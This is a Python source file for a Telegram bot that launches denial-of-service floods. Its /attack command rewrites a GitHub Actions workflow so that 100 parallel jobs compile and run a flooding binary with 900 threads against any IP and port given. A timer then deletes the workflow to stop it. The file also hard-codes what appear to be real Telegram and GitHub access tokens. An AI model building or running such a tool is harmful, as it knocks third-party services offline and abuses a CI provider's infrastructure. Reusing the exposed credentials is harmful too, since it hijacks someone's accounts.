import os
import threading
from github import Github, Auth
from telegram.ext import Application, CommandHandler

# 🚨 Tokens
TELEGRAM_TOKEN = "7737134616:AAHBApoF9ukOxgg3x0zd2qtU5j-8DonJssg"
GITHUB_TOKEN = "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"
REPO_NAME = "telemaster895/master"

# GitHub connect
auth = Auth.Token(GITHUB_TOKEN)
g = Github(auth=auth)
repo = g.get_repo(REPO_NAME)
WORKFLOW_PATH = ".github/workflows/main.yml"

def update_workflow(ip, port, time, runs=100, threads=900):
    yml_content = f"""name: Run Soul {runs}x

on: [push]

jobs:
  soul:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        n: [{','.join(str(i) for i in range(1, runs+1))}]
    steps:
      - uses: actions/checkout@v3
      - run: gcc soul.c -o soul1 -lpthread
      - run: sudo ./soul1 {ip} {port} {time} {threads}
"""
    try:
        contents = repo.get_contents(WORKFLOW_PATH)
        repo.update_file(contents.path, "Update workflow", yml_content, contents.sha, branch="main")
    except:
        repo.create_file(WORKFLOW_PATH, "Create workflow", yml_content, branch="main")

def delete_workflow():
    try:
        contents = repo.get_contents(WORKFLOW_PATH)
        repo.delete_file(contents.path, "Stop workflow", contents.sha, branch="main")
    except:
        pass

# --- Telegram Bot Commands ---
async def start(update, context):
    await update.message.reply_text("🚀 Wellcome to Parmanu Bot!")

async def attack(update, context):
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    
    ip, port, time = context.args
    try:
        seconds = int(time)
    except:
        await update.message.reply_text("⚠️ Time must be number (seconds).")
        return

    update_workflow(ip, port, time, runs=100)
    await update.message.reply_text(f"🔥 100x Attack started!\nIP: {ip}\nPort: {port}\nTime: {time}s")

    # Auto delete workflow after time ends
    def auto_stop():
        delete_workflow()
        context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Attack finished after {time}s. Workflow deleted.")

    timer = threading.Timer(seconds, auto_stop)
    timer.start()

async def stop(update, context):
    delete_workflow()
    await update.message.reply_text("🛑 Attack stopped manually, workflow removed.")

async def status(update, context):
    try:
        repo.get_contents(WORKFLOW_PATH)
        await update.message.reply_text("✅ Attack is currently RUNNING (100x).")
    except:
        await update.message.reply_text("❌ No attack running, workflow stopped.")

async def main():
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))

    await application.run_polling()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())